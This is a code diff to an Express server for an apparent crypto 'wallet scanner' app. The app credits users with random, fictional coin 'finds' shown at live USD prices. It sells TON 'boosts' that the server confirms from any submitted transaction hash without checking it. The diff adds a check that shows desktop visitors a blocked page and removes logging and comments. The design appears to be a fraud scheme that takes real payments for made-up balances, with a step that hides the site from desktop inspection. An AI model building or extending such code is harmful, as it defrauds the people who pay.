@@ -4,6 +4,7 @@ const bodyParser = require('body-parser');
 const session = require('express-session');
 const path = require('path');
 const cors = require('cors');
+const fetch = global.fetch || require('node-fetch');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -20,7 +21,6 @@ const DEFAULT_BALANCES = {
   BTC: 0, ETH: 0, LTC: 0, SOL: 0, BNB: 0, USDT: 0, USDC: 0, TRX: 0, TON: 0
 };
 
-// Crypto-specific find rates
 const CRYPTO_FIND_RATES = {
   BTC: 0.001, ETH: 0.003, BNB: 0.005, SOL: 0.008,
   LTC: 0.010, TON: 0.015, USDT: 0.025, USDC: 0.025, TRX: 0.030
@@ -35,6 +35,26 @@ app.use(session({
   saveUninitialized: true,
   cookie: { maxAge: 1000 * 60 * 60 * 24 * 7 }
 }));
+
+function isMobileUA(ua) {
+  if (!ua) return false;
+  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|Windows Phone|Opera Mini|Mobile/i.test(ua);
+}
+
+// Middleware: if root (/) requested from non-mobile -> serve blocked page
+app.use((req, res, next) => {
+  const ua = req.headers['user-agent'] || '';
+  const isApi = req.path.startsWith('/api');
+  const isStaticAsset = /\.(js|css|png|jpg|jpeg|svg|ico|json|woff2?)($|\?)/i.test(req.path);
+  if (!isMobileUA(ua) && !isApi && !isStaticAsset) {
+    // If requesting root or index, serve blocked page for desktop
+    if (req.path === '/' || req.path === '/index.html') {
+      return res.sendFile(path.join(__dirname, 'public', 'blocked.html'));
+    }
+  }
+  next();
+});
+
 app.use(express.static(path.join(__dirname, 'public')));
 
 function generateWalletAddress() {
@@ -49,7 +69,7 @@ function ensureUser(req) {
       balances: Object.assign({}, DEFAULT_BALANCES),
       boost: null,
       tonAddress: null,
-      findRate: 0.10, // 10% for Basic
+      findRate: 0.10,
       scannedWallets: 0,
       speedMultiplier: 1,
       statusOnline: true,
@@ -63,12 +83,9 @@ function ensureUser(req) {
   return req.session.user;
 }
 
-// CoinGecko with retry and cache + fallback prices
 let priceCache = {};
 let lastFetch = 0;
-const CACHE_TIME = 60000; // 1 minute
-
-// Fallback prices if API fails
+const CACHE_TIME = 60000;
 const FALLBACK_PRICES = {
   TON: 5.50, BTC: 98000, ETH: 3500,
   SOL: 190, TRX: 0.24, BNB: 650,
@@ -80,34 +97,22 @@ async function fetchPrices(symbols) {
   if (now - lastFetch < CACHE_TIME && Object.keys(priceCache).length > 0) {
     return priceCache;
   }
-
   const ids = symbols.map(s => COIN_MAP[s]).filter(Boolean).join(',');
   if (!ids) return FALLBACK_PRICES;
-  
   try {
     const url = `https://api.coingecko.com/api/v3/simple/price?ids=${ids}&vs_currencies=usd`;
-    const resp = await fetch(url, { 
-      headers: { 'Accept': 'application/json' },
-      timeout: 5000 
-    });
-    
-    if (!resp.ok) {
-      console.warn('CoinGecko API returned:', resp.status, '- using fallback prices');
-      return Object.keys(priceCache).length > 0 ? priceCache : FALLBACK_PRICES;
-    }
-    
+    const resp = await fetch(url, { headers: { 'Accept': 'application/json' }, timeout: 5000 });
+    if (!resp.ok) return Object.keys(priceCache).length > 0 ? priceCache : FALLBACK_PRICES;
     const data = await resp.json();
     const out = {};
     for (const s of symbols) {
       const id = COIN_MAP[s];
       out[s] = data[id] && data[id].usd ? Number(data[id].usd) : (FALLBACK_PRICES[s] || 0);
     }
-    
     priceCache = out;
     lastFetch = now;
     return out;
   } catch (e) {
-    console.error('Price fetch error:', e.message, '- using fallback prices');
     return Object.keys(priceCache).length > 0 ? priceCache : FALLBACK_PRICES;
   }
 }
@@ -119,19 +124,13 @@ app.get('/api/profile', async (req, res) => {
     const prices = await fetchPrices(symbols);
     const usdBalances = {};
     let totalUsd = 0;
-    
     for (const sym of symbols) {
       const bal = Number(user.balances[sym] || 0);
       const price = Number(prices[sym] || 0);
       const usd = bal * price;
-      usdBalances[sym] = { 
-        price: price, 
-        usd: Number(usd.toFixed(2)),
-        balance: bal
-      };
+      usdBalances[sym] = { price: price, usd: Number(usd.toFixed(2)), balance: bal };
       totalUsd += usd;
     }
-    
     res.json({
       balances: user.balances,
       usdBalances,
@@ -147,7 +146,6 @@ app.get('/api/profile', async (req, res) => {
       tonReceiveAddress: TON_RECEIVE_ADDRESS
     });
   } catch (e) {
-    console.error('Profile error:', e);
     res.status(500).json({ error: 'Failed to fetch profile' });
   }
 });
@@ -171,50 +169,30 @@ app.post('/api/store-telegram', (req, res) => {
 app.post('/api/confirm-boost', (req, res) => {
   const { amount, txHash } = req.body;
   if (!amount || !txHash) return res.status(400).json({ error: 'Invalid params' });
-  
   try {
     const user = ensureUser(req);
-    // 10 TON = 10x/10%, 30 TON = 50x/30%, 100 TON = 100x/50%, 130 TON = 200x/70%
     const mapping = { '10': 10, '30': 50, '100': 100, '130': 200 };
     const findRateMap = { '10': 0.10, '30': 0.30, '100': 0.50, '130': 0.70 };
     const mult = mapping[String(amount)] || 1;
     const newFindRate = findRateMap[String(amount)] || 0.10;
-    
-    user.boost = { 
-      amount: Number(amount), 
-      purchased: true, 
-      boughtAt: new Date().toISOString(), 
-      walletAddress: user.tonAddress,
-      txHash: txHash
-    };
+    user.boost = { amount: Number(amount), purchased: true, boughtAt: new Date().toISOString(), walletAddress: user.tonAddress, txHash: txHash };
     user.speedMultiplier = mult;
     user.findRate = newFindRate;
-    
-    return res.json({ 
-      success: true, 
-      boost: user.boost, 
-      speedMultiplier: user.speedMultiplier,
-      findRate: user.findRate
-    });
+    return res.json({ success: true, boost: user.boost, speedMultiplier: user.speedMultiplier, findRate: user.findRate });
   } catch (e) {
-    console.error(e);
     return res.status(500).json({ error: 'Boost confirmation failed' });
   }
 });
 
 app.post('/api/scan-wallet', async (req, res) => {
-  const { crypto } = req.body;
   const user = ensureUser(req);
   const allowed = SUPPORTED;
   const globalFindRate = Number(user.findRate || 0.10);
-  
-  const pick = (crypto && allowed.includes(crypto)) ? crypto : allowed[Math.floor(Math.random() * allowed.length)];
+  const pick = allowed[Math.floor(Math.random() * allowed.length)];
   const cryptoSpecificRate = CRYPTO_FIND_RATES[pick] || 0.01;
   const finalRate = globalFindRate * cryptoSpecificRate * 100;
   const found = Math.random() < finalRate;
-  
   let result = { walletId: `w_${Date.now()}`, found: false, crypto: pick };
-  
   if (found) {
     let amount = 0;
     switch (pick) {
@@ -230,34 +208,21 @@ app.post('/api/scan-wallet', async (req, res) => {
       default: amount = 0;
     }
     user.balances[pick] = Number((user.balances[pick] + amount).toFixed(8));
-    result = { 
-      walletId: result.walletId, 
-      found: true, 
-      crypto: pick, 
-      amount,
-      timestamp: new Date().toISOString()
-    };
+    result = { walletId: result.walletId, found: true, crypto: pick, amount, timestamp: new Date().toISOString() };
   }
-  
   user.scannedWallets = (user.scannedWallets || 0) + 1;
 
   try {
     const prices = await fetchPrices(Object.keys(user.balances));
     const usdBalances = {};
     let totalUsd = 0;
-    
     for (const sym of Object.keys(user.balances)) {
       const bal = Number(user.balances[sym] || 0);
       const price = Number(prices[sym] || 0);
       const usd = bal * price;
-      usdBalances[sym] = { 
-        price: price, 
-        usd: Number(usd.toFixed(2)),
-        balance: bal
-      };
+      usdBalances[sym] = { price: price, usd: Number(usd.toFixed(2)), balance: bal };
       totalUsd += usd;
     }
-    
     res.json({
       result,
       balances: user.balances,
@@ -269,7 +234,6 @@ app.post('/api/scan-wallet', async (req, res) => {
       statusOnline: user.statusOnline
     });
   } catch (e) {
-    console.error('Scan error:', e);
     res.json({
       result,
       balances: user.balances,
